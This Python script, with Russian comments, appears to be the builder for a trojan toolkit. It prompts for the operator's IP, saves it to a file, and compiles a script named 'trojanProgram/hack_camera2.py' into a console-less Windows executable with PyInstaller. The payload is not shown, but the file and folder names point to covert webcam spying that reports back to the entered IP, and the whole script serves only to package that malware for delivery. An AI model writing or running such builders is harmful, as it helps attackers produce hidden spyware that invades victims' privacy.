import os
import time
import subprocess

def save_ip_to_file(ip, filename="ip.txt"):
    """Сохраняет IP-адрес в файл."""
    with open(filename, 'w') as f:
        f.write(ip)

def load_ip_from_file(filename="ip.txt"):
    """Загружает IP-адрес из файла."""
    with open(filename, 'r') as f:
        return f.read()

def compile_to_exe(script_path):
    """Компилирует указанный Python файл в .exe с помощью PyInstaller."""
    try:
        print(f"Компилируем {script_path} в .exe...")
        # Запускаем PyInstaller команду для компиляции файла в .exe
        subprocess.run(['pyinstaller', '--onefile', '--noconsole', script_path], check=True)
        print(f"Компиляция {script_path} завершена!")
    except subprocess.CalledProcessError as e:
        print(f"Ошибка при компиляции: {e}")

def main():
    print("Эта программа работает только на Windows")
    choice = input("Вы хотите продолжить (Yes/No): ")

    if choice.lower() == "yes":
        ip = input("Введите ваш IP: ")
        save_ip_to_file(ip)
        print("IP сохранен. Компиляция программы через 3 секунды...")
        time.sleep(3)

        # Укажите полный путь к файлу 'hack_camera2.py'
        script_path = os.path.join(os.getcwd(), 'trojanProgram', 'hack_camera2.py')

        # Запускаем компиляцию
        compile_to_exe(script_path)

if __name__ == "__main__":
    main()
